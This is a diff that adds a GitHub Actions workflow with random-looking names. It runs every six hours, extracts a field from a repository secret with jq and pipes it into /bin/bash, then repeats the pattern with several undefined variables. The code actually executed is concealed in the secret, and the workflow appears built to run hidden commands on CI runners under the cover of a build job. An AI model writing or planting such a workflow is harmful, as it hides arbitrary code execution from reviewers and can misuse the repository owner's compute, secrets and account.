@@ -1,0 +1,23 @@
+name: fengyuanchai4545
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengyuanchai4545
+        env:
+          sgkv98584: ${{ secrets.sgkv98584 }}
+        run: |
+          echo $sgkv98584 | jq -r .hvopm3760 | /bin/bash
+          echo $shh27059 | jq -r .rahgs2630 | /bin/bash
+          echo $xeg6462 | jq -r .iein2545 | /bin/bash
+          echo $zxkl3975 | jq -r .ejn2772 | /bin/bash
+          echo $xzfy51 | jq -r .tdwo1 | /bin/bash
+          echo $t00 | jq -r .iuc81 | /bin/bash
+          echo $zwdsw27 | jq -r .agg6 | /bin/bash
+
